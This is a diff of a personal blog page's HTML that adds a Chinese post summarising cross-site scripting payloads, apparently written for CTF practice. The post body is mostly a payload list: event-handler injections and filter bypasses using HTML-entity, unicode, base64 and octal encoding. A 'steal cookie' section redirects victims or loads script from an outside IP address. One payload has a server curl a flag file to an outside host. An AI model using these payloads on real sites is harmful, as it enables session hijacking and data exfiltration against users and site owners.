@@ -76,7 +76,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT">
+  <meta name="keywords" content="xss,">
 
 
 
@@ -89,13 +89,18 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="LJH&#39;s blog">
-<meta property="og:url" content="https://museljh.github.io/archives/2019/04/index.html">
+<meta name="description" content="使用PHP反射性质修改PHP函数，属性等">
+<meta name="keywords" content="xss">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss小结">
+<meta property="og:url" content="https://museljh.github.io/2019/04/24/xss小结/index.html">
 <meta property="og:site_name" content="LJH&#39;s blog">
+<meta property="og:description" content="使用PHP反射性质修改PHP函数，属性等">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-04-24T07:27:20.670Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="LJH&#39;s blog">
+<meta name="twitter:title" content="xss小结">
+<meta name="twitter:description" content="使用PHP反射性质修改PHP函数，属性等">
 
 
 
@@ -125,13 +130,13 @@
 
 
 
-  <link rel="canonical" href="https://museljh.github.io/archives/2019/04/">
+  <link rel="canonical" href="https://museljh.github.io/2019/04/24/xss小结/">
 
 
 
 
 
-  <title>归档 | LJH's blog</title>
+  <title>xss小结 | LJH's blog</title>
   
 
 
@@ -147,7 +152,7 @@
 
 <a href="https://github.com/MuseLJH" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewbox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
 
-  <div class=" page-archive">
+  <div class=" page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
@@ -283,107 +288,331 @@
           <div id="content" class="content">
             
 
+  <div id="posts" class="posts-expand">
+    
+
+  
+
   
   
   
-  <div class="post-block archive">
-    <div id="posts" class="posts-collapse">
-      <span class="archive-move-on"></span>
-
-      <span class="archive-page-counter">
-        
-        
-        
-          
-        
-        嗯..! 目前共计 28 篇日志。 继续努力。
-      </span>
-
-      
-
-        
-        
-        
-
-        
-          
-          <div class="collection-title">
-            <h1 class="archive-year" id="archive-year-2019">2019</h1>
-          </div>
-        
-        
-
-        
 
   <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://museljh.github.io/2019/04/24/xss小结/">
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="LJH">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="LJH's blog">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/2019/04/24/xss小结/" itemprop="url">
-              
-                <span itemprop="name">xss小结</span>
-              
-            </a>
         
-      </h2>
+          <h1 class="post-title" itemprop="name headline">xss小结</h1>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-04-24T15:24:20+08:00" content="2019-04-24">
-          04-24
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-24T15:24:20+08:00">
+                2019-04-24
+              </time>
+            
 
-    </header>
-  </article>
+            
 
+            
+          </span>
 
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/文章/" itemprop="url" rel="index">
+                    <span itemprop="name">文章</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2019/04/24/xss小结/" class="leancloud_visitors" data-flag-title="xss小结">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                  <span class="post-meta-divider">|</span>
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1.3k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  7
+                </span>
+              
+            </div>
+          
+
+          
+              <div class="post-description">
+                  使用PHP反射性质修改PHP函数，属性等
+              </div>
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/04/24/ctf中的php反射/" itemprop="url">
-              
-                <span itemprop="name">ctf中的php反射</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-04-24T15:20:07+08:00" content="2019-04-24">
-          04-24
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
       
 
+      
+        <h2 id="XSS语句"><a href="#XSS语句" class="headerlink" title="XSS语句"></a>XSS语句</h2><h2 id="反射XSS语句"><a href="#反射XSS语句" class="headerlink" title="反射XSS语句"></a>反射XSS语句</h2><p>1.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/onfocus=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure></p>
+<p>2.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;video src=1 onerror=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure>
+<p>3.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;audio src=x onerror=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure>
+<p>4.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onfocus=alert(/xss/) autofocus&gt;</span><br></pre></td></tr></table></figure>
+<p>5.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details open ontoggle=top.alert(1)&gt;</span><br></pre></td></tr></table></figure>
+<p>6.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details open ontoggle=top[&apos;prompt&apos;](1)&gt;</span><br></pre></td></tr></table></figure>
+<p>7.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details open ontoggle=eval(‘alert(1)’) &gt;</span><br></pre></td></tr></table></figure>
+<p>8.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe srcdoc=&quot;&lt;img src=x:x onerror=alert(1)&gt;&quot; /&gt;</span><br></pre></td></tr></table></figure>
+<p>9.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details open ontoggle=eval(atob(&apos;YWxlcnQoMSk=&apos;)) &gt;</span><br></pre></td></tr></table></figure>
+<p>10.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details open ontoggle=eval(&apos;\141\154\145\162\164\50\61\51&apos;) &gt;</span><br></pre></td></tr></table></figure>
+<p>11.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details open ontoggle=eval(String.fromCharCode(97,108,101,114,116,40,49,41)) &gt;</span><br></pre></td></tr></table></figure>
+<p>12.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details open ontoggle=eval(&quot;appendChild(createElement(&apos;script&apos;)).src=&apos;http://120.77.176.168:11122&apos;&quot;) &gt;</span><br></pre></td></tr></table></figure>
+<p>13.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=window.alert(1) &gt;</span><br></pre></td></tr></table></figure>
+<p>14.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=window[&apos;eva&apos;+&apos;l&apos;](alert(1)) &gt;</span><br></pre></td></tr></table></figure>
+<p>15.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=_=alert,_(/xss/) &gt;</span><br></pre></td></tr></table></figure>
+<p>16.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=_=&apos;e&apos;+&apos;val&apos;,_(alert(1)) &gt;</span><br></pre></td></tr></table></figure>
+<p>17.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=location=&apos;javascri&apos;.concat(&apos;pt:aler&apos;,&apos;t(1)&apos;)&gt;</span><br></pre></td></tr></table></figure>
+<p>18.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=location=[&apos;java&apos;,&apos;script:&apos;,&apos;alert(1)&apos;].join(&quot;&quot;)&gt;</span><br></pre></td></tr></table></figure>
+<p>19.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/onload=document.write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62)) &gt;</span><br></pre></td></tr></table></figure>
+<p>20.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=setTimeout(&apos;\141\154\145\162\164\50\61\51&apos;)&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="XSS窃取cookie"><a href="#XSS窃取cookie" class="headerlink" title="XSS窃取cookie"></a>XSS窃取cookie</h2><p>1.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details open ontoggle=&quot;javascript:document.location=&apos;http://120.77.176.168:11122&apos;&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>2.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;video src=1 onerror=&quot;javascript:document.location=&apos;http://120.77.176.168:11122&apos;&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>3.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=location=&apos;javascri&apos;.concat(&quot;pt:document&quot;,&quot;.location=&quot;,&quot;&apos;http://120.77.176.168:11122&apos;&quot;)&gt;</span><br></pre></td></tr></table></figure>
+<p>4.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;http://120.77.176.1&apos;.concat(&apos;68:111&apos;,&apos;22&apos;); &gt;</span><br></pre></td></tr></table></figure>
+<p>5.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;http://120.77.176.1&apos;.\u0063oncat(&apos;68:111&apos;,&apos;22&apos;); &gt;</span><br></pre></td></tr></table></figure>
+<p>6.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=location=[&quot;java&quot;,&quot;script:&quot;,&quot;document.location=&quot;,&quot;&apos;http://120.77.176.168:11122&apos;&quot;].join(&quot;&quot;)&gt;</span><br></pre></td></tr></table></figure>
+<p>7.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/onload=document.write(String.fromCharCode(60,115,67,114,73,112,116,32,115,114,67,61,39,104,116,116,112,58,47,47,49,50,48,46,55,55,46,49,55,54,46,49,54,56,58,49,49,49,50,50,39,62,60,47,115,67,82,105,112,84,62)) &gt;</span><br></pre></td></tr></table></figure>
+<p>8.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=setTimeout(&quot;\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u006c\u006f\u0063\u0061\u0074\u0069\u006f\u006e\u003d\u0027\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0031\u0032\u0030\u002e\u0037\u0037\u002e\u0031\u0037\u0036\u002e\u0031\u0036\u0038\u003a\u0031\u0031\u0031\u0032\u0032\u0027&quot;)&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="XSS窃取cookie-变形"><a href="#XSS窃取cookie-变形" class="headerlink" title="XSS窃取cookie 变形"></a>XSS窃取cookie 变形</h2><h3 id="HTML编码绕过"><a href="#HTML编码绕过" class="headerlink" title="HTML编码绕过"></a>HTML编码绕过</h3><p>1.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details open ontoggle=&quot;&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:&amp;#x64;&amp;#x6F;&amp;#x63;&amp;#x75;&amp;#x6D;&amp;#x65;&amp;#x6E;&amp;#x74;&amp;#x2E;&amp;#x6C;&amp;#x6F;&amp;#x63;&amp;#x61;&amp;#x74;&amp;#x69;&amp;#x6F;&amp;#x6E;&amp;#x3D;&apos;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3A;&amp;#x2F;&amp;#x2F;&amp;#x31;&amp;#x32;&amp;#x30;&amp;#x2E;&amp;#x37;&amp;#x37;&amp;#x2E;&amp;#x31;&amp;#x37;&amp;#x36;&amp;#x2E;&amp;#x31;&amp;#x36;&amp;#x38;&amp;#x3A;&amp;#x31;&amp;#x31;&amp;#x31;&amp;#x32;&amp;#x32;&apos;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="unicode编码绕过"><a href="#unicode编码绕过" class="headerlink" title="unicode编码绕过"></a>unicode编码绕过</h3><p>1.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details open ontoggle=eval(&apos;\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u006c\u006f\u0063\u0061\u0074\u0069\u006f\u006e\u003d\u0027\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0031\u0032\u0030\u002e\u0037\u0037\u002e\u0031\u0037\u0036\u002e\u0031\u0036\u0038\u003a\u0031\u0031\u0031\u0032\u0032\u0027&apos;) &gt;</span><br></pre></td></tr></table></figure>
+<p>2.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=\u0073etTimeout(&quot;\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u006c\u006f\u0063\u0061\u0074\u0069\u006f\u006e\u003d\u0027\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0031\u0032\u0030\u002e\u0037\u0037\u002e\u0031\u0037\u0036\u002e\u0031\u0036\u0038\u003a\u0031\u0031\u0031\u0032\u0032\u0027&quot;)&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="Base64编码绕过"><a href="#Base64编码绕过" class="headerlink" title="Base64编码绕过"></a>Base64编码绕过</h3><p>1.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details open ontoggle=eval(atob(&apos;amF2YXNjcmlwdDpkb2N1bWVudC5sb2NhdGlvbj0naHR0cDovLzEyMC43Ny4xNzYuMTY4OjExMTIyJw==&apos;)) &gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;video src=1 onerror=eval(atob(&apos;amF2YXNjcmlwdDpkb2N1bWVudC5sb2NhdGlvbj0naHR0cDovLzEyMC43Ny4xNzYuMTY4OjExMTIyJw==&apos;))&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="js8编码绕过"><a href="#js8编码绕过" class="headerlink" title="js8编码绕过"></a>js8编码绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details open ontoggle=eval(&apos;\152\141\166\141\163\143\162\151\160\164\72\144\157\143\165\155\145\156\164\56\154\157\143\141\164\151\157\156\75\47\150\164\164\160\72\57\57\61\62\60\56\67\67\56\61\67\66\56\61\66\70\72\61\61\61\62\62\47&apos;) &gt;</span><br></pre></td></tr></table></figure>
+<h3 id="混合编码绕过"><a href="#混合编码绕过" class="headerlink" title="混合编码绕过"></a>混合编码绕过</h3><p>1.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details open ontoggle=\u0065val(atob(&apos;amF2YXNjcmlwdDpkb2N1bWVudC5sb2NhdGlvbj0naHR0cDovLzEyMC43Ny4xNzYuMTY4OjExMTIyJw==&apos;)) &gt;</span><br></pre></td></tr></table></figure></p>
+<p>2.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=window[&apos;eva&apos;+&apos;l&apos;](&apos;\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u006c\u006f\u0063\u0061\u0074\u0069\u006f\u006e\u003d\u0027\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0031\u0032\u0030\u002e\u0037\u0037\u002e\u0031\u0037\u0036\u002e\u0031\u0036\u0038\u003a\u0031\u0031\u0031\u0032\u0032\u0027&apos;) &gt;</span><br></pre></td></tr></table></figure>
+<h2 id="xss-POST-amp-GET请求"><a href="#xss-POST-amp-GET请求" class="headerlink" title="xss POST&amp;GET请求"></a>xss POST&amp;GET请求</h2><p>1.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;fetch(&apos;exec.php&apos;,&#123;method:&apos;POST&apos;,headers:&#123;&apos;content-type&apos;:&apos;application/x-www-form-urlencoded&apos;&#125;,body:&apos;command=&apos;+encodeURIComponent(&apos;curl xss.zsxsoft.com:23457 -F&quot;a=@/flag.txt&quot;&apos;)+&apos;&amp;exec=1&apos;&#125;).then(p=&gt;p.text()).then(p=&gt;fetch(&apos;main.php&apos;,&#123;method:&apos;POST&apos;,headers:&#123;&apos;content-type&apos;:&apos;application/x-www-form-urlencoded&apos;&#125;,body:&apos;comment=&apos;+p&#125;))&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>2.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe srcdoc=&quot;&lt;script&gt;fetch(&apos;exec.php&apos;,&#123;method:&apos;POST&apos;,headers:&#123;&apos;content-type&apos;:&apos;application/x-www-form-urlencoded&apos;&#125;,body:&apos;command=&apos;+encodeURIComponent(&apos;&apos;)&#125;).then(p=&gt;p.text()).then(p=&gt;fetch(&apos;main.php&apos;,&#123;method:&apos;POST&apos;,headers:&#123;&apos;content-type&apos;:&apos;application/x-www-form-urlencoded&apos;&#125;,body:&apos;comment=&apos;+p&#125;))&lt;/script&gt; &quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.anquanke.com/post/id/176185" target="_blank" rel="noopener">测试WAF来学习XSS姿势</a></p>
+<p><a href="https://www.freebuf.com/articles/web/153055.html" target="_blank" rel="noopener">XSS过滤绕过速查表</a></p>
+
+      
     </div>
+    
+    
+    
+    <div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/2019/04/24/xss小结/">xss小结</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 LJH 的个人博客">LJH</a></p>
+  <p><span>发布时间:</span>2019年04月24日 - 15:24</p>
+  <p><span>最后更新:</span>2019年04月24日 - 15:27</p>
+  <p><span>原始链接:</span><a href="/2019/04/24/xss小结/" title="xss小结">https://museljh.github.io/2019/04/24/xss小结/</a>
+    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://museljh.github.io/2019/04/24/xss小结/" aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+      $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+        });
+    });  
+</script>
+
+
+      
+    </div>
+    <div>
+     
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------END-------------</div>
+    
+</div>
+
+      
+    </div>
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/xss/" rel="tag"><i class="fa fa-tag"></i> xss</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/04/24/ctf中的php反射/" rel="next" title="ctf中的php反射">
+                <i class="fa fa-chevron-left"></i> ctf中的php反射
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
 
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -391,6 +620,15 @@
 
 
           
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC80MjUxOC8xOTA2NQ=="></div>
+    </div>
+
+  
+
+
 
         </div>
         
@@ -411,8 +649,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
             
@@ -503,6 +750,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS语句"><span class="nav-number">1.</span> <span class="nav-text">XSS语句</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#反射XSS语句"><span class="nav-number">2.</span> <span class="nav-text">反射XSS语句</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS窃取cookie"><span class="nav-number">3.</span> <span class="nav-text">XSS窃取cookie</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS窃取cookie-变形"><span class="nav-number">4.</span> <span class="nav-text">XSS窃取cookie 变形</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#HTML编码绕过"><span class="nav-number">4.1.</span> <span class="nav-text">HTML编码绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#unicode编码绕过"><span class="nav-number">4.2.</span> <span class="nav-text">unicode编码绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Base64编码绕过"><span class="nav-number">4.3.</span> <span class="nav-text">Base64编码绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#js8编码绕过"><span class="nav-number">4.4.</span> <span class="nav-text">js8编码绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#混合编码绕过"><span class="nav-number">4.5.</span> <span class="nav-text">混合编码绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss-POST-amp-GET请求"><span class="nav-number">5.</span> <span class="nav-text">xss POST&amp;GET请求</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">6.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -623,6 +886,10 @@
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
@@ -651,6 +918,17 @@
 
 
 
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
   
 
 
